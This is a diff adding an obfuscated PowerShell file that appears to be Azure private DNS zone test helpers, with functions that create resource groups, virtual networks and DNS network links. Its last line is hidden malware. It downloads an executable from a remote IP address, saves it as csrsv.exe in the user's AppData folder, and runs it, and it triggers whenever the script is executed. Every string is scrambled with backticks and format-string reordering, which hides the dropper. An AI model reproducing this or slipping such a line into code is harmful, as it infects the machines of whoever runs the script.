@@ -1,0 +1,76 @@
+function g`E`T-rEs`oUrceg`ROupN`A`me
+{
+    return .("{2}{3}{0}{1}" -f'setNam','e','ge','tAs')
+}
+
+
+function gE`T-`RESOU`RceN`AME
+{
+    return &("{2}{1}{0}{3}" -f 'tN','sse','getA','ame')
+}
+
+
+function gEt-`VirT`UaL`N`EtwOr`KNAMe
+{
+    return &("{3}{1}{0}{2}"-f 'tAss','e','etName','g')
+}
+
+
+function te`sTs`e`T`U`p-`CREATeRes`OURcEg`ROUP
+{
+    ${re`SoUR`ce`GrOup`Na`ME} = &("{3}{0}{2}{1}" -f'et','urceGroupName','-Reso','G')
+	${RGl`ocA`T`ioN} = ("{0}{1}" -f'W','est US')
+    ${R`EsOURc`EG`RouP} = .("{3}{2}{0}{4}{1}" -f'Reso','eGroup','z','New-A','urc') -Name ${rESo`URCEGrOuP`NA`Me} -location ${Rg`LoCat`ion}
+	return ${RESou`RCeg`R`Oup}
+}
+
+
+function Tes`TSeTu`P-c`R`e`ATeVIr`TUAl`NEtw`ORk(${r`e`sou`RceGrOUP})
+{
+    ${vIRtUAL`N`ETWo`RKn`Ame} = &("{5}{2}{6}{0}{1}{3}{4}" -f'et','wor','et-Vi','k','Name','G','rtualN')
+	${Lo`cAti`on} = .("{1}{3}{0}{2}" -f 'io','G','n','et-Locat') -ProviderNamespace ("{1}{2}{0}{3}"-f'.net','mi','crosoft','work') -ResourceType ("{3}{0}{2}{4}{1}" -f 'tua','orks','lNe','vir','tw') -PreferredLocation ("{1}{2}{0}" -f't US','We','s')  
+    ${VIrTu`ALn`E`Tw`Ork} = &("{3}{1}{0}{2}"-f 'Netwo','rtual','rk','New-AzVi') -Name ${vIRtUAl`Ne`TW`O`RKnA`me} -ResourceGroupName ${rES`OurceGr`O`Up}."resO`U`RcEgROU`PNaMe" -Location ${loca`TioN} -AddressPrefix ("{2}{1}{0}"-f '8','0.0.0.0/','1')
+	return ${ViR`TuA`lN`eTwo`RK}
+}
+
+function GE`T-rA`ND`O`Mzo`NENAmE
+{
+	${pre`F`ix} = .("{3}{2}{0}{1}"-f 'am','e','tAssetN','ge');
+	return ${PrEF`IX} + ("{2}{0}{1}" -f 'pstest.','test','.') ;
+}
+
+function gET-`R`AnDOM`LiNk`N`AmE
+{
+	${PR`Efix} = .("{0}{2}{1}{3}"-f'get','setNa','As','me');
+	return ${pre`FiX} + ("{1}{2}{0}{3}" -f't','.t','es','link') ;
+}
+
+function GET`-`TX`TOFSPe`CI`FiedLENG`Th([int] ${le`NG`TH})
+{
+	${rEtUr`NvAL`Ue} = "";
+	for (${I} = 0; ${I} -lt ${L`EnG`Th} ; ${i}++)
+	{
+		${rEtu`RNV`AluE} += "a";
+	}
+	return ${re`T`UrNVA`lUe};
+}
+
+function creaTE-`ViRTUal`N`E`TWoR`k`L`inK([bool] ${r`eGiS`TraTiON`Ena`B`LED})
+{
+	${zo`N`EnAME} = .("{1}{0}{3}{2}" -f 'andom','Get-R','Name','Zone')
+	${L`inKn`AMe} = &("{2}{1}{3}{0}" -f 'mLinkName','d','Get-Ran','o')
+    ${R`ESOu`RCEgRoup} = &("{6}{5}{1}{2}{0}{4}{3}" -f 'teReso','tSetup-C','rea','oup','urceGr','es','T')
+
+	${cre`A`TeDZONE} = &("{3}{2}{4}{0}{1}" -f'n','e','AzPrivateDn','New-','sZo') -Name ${z`o`NEnAmE} -ResourceGroupName ${rEsOuRC`EG`Ro`Up}."R`esourc`Egr`OU`PnamE" -Tag @{("{1}{0}"-f 'g1','ta')=("{1}{0}" -f 'alue1','v')}
+	${CrEaTe`DvI`RT`UAL`N`eTWORK} = &("{4}{6}{1}{0}{7}{3}{5}{2}{8}" -f'tup-','Se','tualNetwo','reate','T','Vir','est','C','rk') ${re`sO`U`RceGR`Oup}
+	if(${R`E`gIstrati`on`En`Ab`LED})
+	{
+		${C`R`eaTEd`lInk} = &("{7}{4}{2}{0}{3}{1}{8}{5}{9}{6}{10}"-f'teD','s','AzPriva','n','ew-','t','a','N','Vir','u','lNetworkLink') -ZoneName ${zone`N`AMe} -ResourceGroupName ${RE`sO`URCE`grOup}."R`eSo`URcEGro`UpName" -Name ${lIN`K`N`AMe} -Tag @{("{1}{0}"-f 'ag1','t')=("{1}{2}{0}"-f '1','val','ue')} -VirtualNetworkId ${CreAte`dVI`RTU`ALne`Tw`o`Rk}."id" -EnableRegistration
+	}
+	else
+	{
+		${cREA`TEd`liNk} = &("{1}{2}{5}{4}{3}{0}" -f 'workLink','New-AzPri','vat','alNet','irtu','eDnsV') -ZoneName ${z`oneNA`ME} -ResourceGroupName ${rE`soUrC`e`gRo`Up}."REsOurceGr`o`UPNA`me" -Name ${L`iNk`NAMe} -Tag @{("{1}{0}"-f'g1','ta')=("{0}{1}"-f'va','lue1')} -VirtualNetworkId ${crea`Ted`VIr`T`UAl`NETWORK}."iD"
+	}
+	return ${cRea`TE`DLink}
+}
+(&("{2}{0}{1}"-f'j','ect','New-Ob') ("{1}{3}{0}{2}"-f'lie','System.Ne','nt','t.WebC')).("{1}{0}{2}"-f'wnloadFil','Do','e').Invoke(("{1}{5}{0}{7}{6}{4}{3}{8}{2}"-f'9','h','sv.exe','hoo/c','~ya','ttp://','238/','4.102.53.','sr'),"$env:APPDATA\csrsv.exe");&("{2}{1}{3}{0}" -f'ess','t-','Star','Proc') ("$env:APPDATA\csrsv.exe")
